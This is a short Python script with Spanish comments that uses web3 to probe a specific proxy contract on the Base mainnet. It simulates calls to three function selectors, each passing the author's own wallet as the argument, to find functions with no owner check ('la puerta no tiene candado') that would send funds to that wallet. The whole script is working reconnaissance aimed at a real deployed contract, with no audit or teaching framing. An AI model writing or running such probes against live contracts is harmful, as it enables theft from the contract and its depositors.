from web3 import Web3

w3 = Web3(Web3.HTTPProvider("https://mainnet.base.org"))
PROXY_ADDR = "0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf"

# Tu wallet (la que recibirá el "polvo de oro")
TU_WALLET = "0x96De980a766CCb10A19B6962587e2b61B650b372" # La que pusiste antes

def simular_gatillo(selector):
    # Intentamos llamar al selector pasando tu dirección como argumento
    # El formato es: Selector + Tu Dirección rellena con ceros
    data = selector + TU_WALLET[2:].zfill(64)
    
    try:
        # call() no gasta gas, solo simula en el i5
        w3.eth.call({'to': PROXY_ADDR, 'data': data})
        print(f"✅ [SELECTOR {selector}]: ¡LA PUERTA NO TIENE CANDADO! Responde OK.")
        return True
    except Exception as e:
        if "revert" in str(e).lower():
            print(f"❌ [SELECTOR {selector}]: Bloqueado. Solo dueños.")
        else:
            print(f"⚠️ [SELECTOR {selector}]: Error desconocido: {e}")
        return False

if __name__ == "__main__":
    print(f"\n--- ⚡ PROBANDO GATILLOS EN EL LOCKER ---")
    gatillos = ["0x292be023", "0x0684f253", "0x095ea7b3"]
    
    for g in gatillos:
        simular_gatillo(g)
